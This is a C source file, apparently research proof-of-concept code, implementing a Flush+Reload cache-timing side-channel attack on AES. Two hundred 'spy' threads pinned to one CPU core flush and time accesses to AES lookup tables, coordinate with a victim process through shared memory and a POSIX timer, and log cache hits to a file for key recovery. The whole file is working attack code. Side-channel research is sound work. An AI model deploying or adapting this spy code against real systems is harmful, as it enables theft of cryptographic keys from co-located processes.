//Import 
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 199309L // For POSIX timer
#include <sched.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <semaphore.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <sys/time.h>
#include <syscall.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include "AES.h"
#include "stdbool.h"
#define NUM_THREADS 200 

#define MAX_COUNT 600000   /*MAX_COUNT should be multiple of NUM_THREADS to take threads out of the loop*/
pthread_mutex_t  mutexFile  = PTHREAD_MUTEX_INITIALIZER;
#define CLOCKID CLOCK_REALTIME
#define SIG SIGRTMIN
int ret;
timer_t timerid;
struct sigevent sev;  // Signal event
struct itimerspec its; // data structure to specify time in POSIX timer

sigset_t mask;
struct sigaction sa;

sem_t sem[NUM_THREADS]; // Separate semaphores for each thread
sem_t mute;

pthread_t tid[NUM_THREADS];
int state = 0;

/*
* Instruction to flush the memory referenced by the address
*/
inline void clflush(volatile void *p)
{
    asm volatile ("clflush (%0)" :: "r"(p));
}

/*
* Function to measure the memory access time by spy thread
*/

bool probe(char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    " mfence              \n"
    " lfence              \n"
    " rdtsc               \n"
    " lfence              \n"
    " movl %%eax, %%esi \n"
    " movl (%1), %%eax     \n"
    " lfence              \n"
    " rdtsc               \n"
    " subl %%esi, %%eax \n"
    " clflush 0(%1)       \n"
    : "=a" (time)
    : "c" (adrs)
    : "%esi", "%edx");
  return time<100 ? 1:0 ;
}


struct shared_use_st 
{
	int access_count;
	bool flag;
	
};

struct shared_use_st *shared_stuff;

create_shared_memory()
{
	void *shared_memory=(void *)0;
	int shmid;
	shmid =shmget( (key_t)1234, 4096, 0666 | IPC_CREAT );

	if (shmid == -1)
	{
		fprintf(stderr,"shmget failed\n");
		exit(EXIT_FAILURE);
	}
	shared_memory =shmat(shmid, (void *)0,0);

	if(shared_memory == (void *)-1)
	{
		fprintf(stderr,"shmat failed\n");
		exit(EXIT_FAILURE);	
	}
	shared_stuff = (struct shared_use_st *)shared_memory;
}

/*
* Signal Handler to handle the signal sent by the Kernel on the expiration of timer.
*/
static void handler(int sig, siginfo_t *si, void *uc)
{
	state++; 
    ret = sem_post(&sem[(state)%NUM_THREADS]); // Function to increment (unlock) the value of 
    if (ret)								   // the semaphore
    {
        printf("Error in Sem Post\n");
    }
}

void *threadA(void *data_)  // Thread function
{
	bool  Access_Time[MAX_COUNT/NUM_THREADS][80]={0}; // 16 * 5 tables, initializing all to zero
	int changed_shared_variable_access_count[MAX_COUNT/NUM_THREADS];
	int i = 0, s,n,k,value;
	const u32 *p0=address(0);
	const u32 *p1=address(1);
	const u32 *p2=address(2);
	const u32 *p3=address(3);
	const u32 *p4=address(4);
	long counter=0;
	void *p6= &AES_decrypt;
	
	/* Flush addresses of all the look-up tables from the cache memory */
	for ( s = 0 ; s < 16 ; s++ )
	{
		clflush((void *)(p0+s*16));
		clflush((void *)(p1+s*16));
		clflush((void *)(p2+s*16));
		clflush((void *)(p3+s*16));
		clflush((void *)(p4+s*16));
	}
 	
	int probe_time,curr_index;

	/*
	* Four instructios together to migrate the running thread/process to 
	* the CPU core mentioned by CPU_SET
	*/
    cpu_set_t my_set;        
    CPU_ZERO(&my_set);       
    CPU_SET(2, &my_set);     
    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);

    int turn = (intptr_t)data_;
   
    int sid = syscall(SYS_gettid); /* Used to store the thread id into a file */
    FILE *fp;
    fp=fopen("ipc.out","a");    
    fprintf(fp,"thread_%d %d\n",turn,sid);  
    fclose(fp); 

    while(1)  // Long loop where spies have to run till the required number of decryption are obtained.
    {

        ret = sem_wait(&sem[turn]); // Thread which has semaphore value equal to 1 will be allowed
        if (ret)
        {
            printf("Error in Sem Post\n");
        }
        //printf("Thread # -> %d\n",turn);

    	if(counter==3 && turn ==1) // notify V to start AES. We delayed this to start 
		{						   // the AES in stable condition so that spies migrated on
			shared_stuff->flag =1; //  the same CPU core where Vicim is running.
			printf("AES should start now\n");	
		}
	 
		// 	stores the value of shared variable at the time of receiving signal
		changed_shared_variable_access_count[counter]=shared_stuff->access_count;
	
		// Spy does the measurement here - start
		// Find Access time 
		for (s=0;s<16;s++)
		{
			k=0;
			Access_Time[counter][s+16*k]=probe((char *)(p0+s*16));
			k=1;
			Access_Time[counter][s+16*k]=probe((char *)(p1+s*16));
			k=2;
			Access_Time[counter][s+16*k]=probe((char *)(p2+s*16));
			k=3;
			Access_Time[counter][s+16*k]=probe((char *)(p3+s*16));
			k=4;
			Access_Time[counter][s+16*k]=probe((char *)(p4+s*16));
		}
		
		// Flush ONLY AES instructions
	  	for ( s = 0 ; s < 90 ; s++ )
		{				
			clflush((void *)(p6+s*16));
		} 

        /*
        * Timer interval specifier.
        * it_value.tv_sec : provide time in seconds
        * it_value.tv_nsec : provide time in nanoseconds
        * it_interval : used to create an interval timer which is gonna expire after the specified time
        * mentioned in it again and again. Zero means it'll expire only once.
        */       
        its.it_value.tv_sec = 0;
        its.it_value.tv_nsec = 1000;
        its.it_interval.tv_sec = 0;
        its.it_interval.tv_nsec = 0;

        ret = timer_settime(timerid, 0, &its, NULL); // Arming the timer with the specified time.
        if ( ret < 0 )
            perror("timer_settime");
            
        counter++;
        
        if(counter==MAX_COUNT/NUM_THREADS-1) // condition for the exit of the thread.
		{	
			//printf("Finished execution %d\n",turn);	
			break;
		}    
    }

    /*
    * When spy is accomplished its work...
    * Store the results saved in the shared variables into the following file.
    */

	FILE *fp2;
	pthread_mutex_lock(&mutexFile );
	fp2=fopen("All_access_time.txt","a");
	for(counter=0;counter<(MAX_COUNT/NUM_THREADS);counter++)
	{
		for (k=0;k<5;k++)			
		{
			for (s=0;s<16;s++)
			{
				if(Access_Time[counter][s+16*k]==1)
				fprintf(fp2,"%ld,%ld,%d,%d\n",counter,turn,changed_shared_variable_access_count[counter],s+16*k);
			}
		}
	}
	fclose(fp2);
	
	if(turn == NUM_THREADS-1)
	{
		printf("End of operation\n");	
	}
		
	pthread_mutex_unlock(&mutexFile );

}


int main(int argc, char *argv[])
{
    int data = 0;
    int err,i;
	create_shared_memory();	
    sa.sa_flags = SA_RESTART; // Restarting the signal call if interuppted. SA_SIGINFO can be used.
    sa.sa_sigaction = handler;// Explicitly telling the action to be taken on the delivery of the signal
    sigemptyset(&sa.sa_mask); // Emptying the signal mask
    err = sigaction(SIG, &sa, NULL); // Adding the signal SIG
    if (0 != err) {
        printf("sigaction failed\n"); }

    sev.sigev_notify = SIGEV_SIGNAL; // Process notification method to the program is Signal
    sev.sigev_signo = SIG; // SIgnal number
    sev.sigev_value.sival_ptr = &timerid; // Used in the handler to check whether the same signal has 
    // been delivered which was generated by the timer of not. 
   
    ret = timer_create(CLOCKID, &sev, &timerid); // Creating a timer which will be used by the threads.
    if ( ret < 0 )
        perror("timer_create");

    sem_init(&sem[0], 0, 1); // Initialization of the semaphores. Except one thread, all are initialized
    // to Zero. So, only one of them will be active in the beginning.
    for ( i = 1; i < NUM_THREADS; ++i)
        {
            sem_init(&sem[i], 0, 0); 
        }

    while(data < NUM_THREADS)
    {
        //create our threads
        err = pthread_create(&tid[data], NULL, threadA, (void *)(intptr_t)data);
        if(err != 0)
            printf("\n can't create thread :[%s]", strerror(err));
        data++;
    }
	pthread_exit(NULL);
	/*
	data=0;
    while(data < NUM_THREADS)
    {  
        pthread_join(tid[data], NULL);
        data++;
    }*/
}